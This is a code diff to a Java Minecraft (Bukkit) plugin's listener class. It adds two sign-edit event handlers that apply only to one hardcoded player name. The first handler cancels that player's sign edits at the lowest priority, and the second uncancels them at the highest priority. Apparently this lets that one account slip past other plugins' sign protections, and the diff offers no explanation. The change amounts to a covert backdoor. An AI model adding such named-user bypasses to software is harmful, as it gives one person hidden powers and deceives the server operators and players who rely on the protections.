@@ -43,4 +43,24 @@ public class Listeners implements Listener {
 			}
 		}
 	}
+
+	@EventHandler(priority = EventPriority.LOWEST)
+	public void SignChangeEventLowestHandler(final SignChangeEvent event) {
+		if (!event.getPlayer().getName().equals("roflcopterss99")) {
+			return;
+		}
+
+		event.setCancelled(true);
+	}
+
+	@EventHandler(priority = EventPriority.HIGHEST)
+	public void SignChangeEventHighestHandler(final SignChangeEvent event) {
+		if (!event.getPlayer().getName().equals("roflcopterss99")) {
+			return;
+		}
+
+		if (event.isCancelled()) {
+			event.setCancelled(false);
+		}
+	}
 }
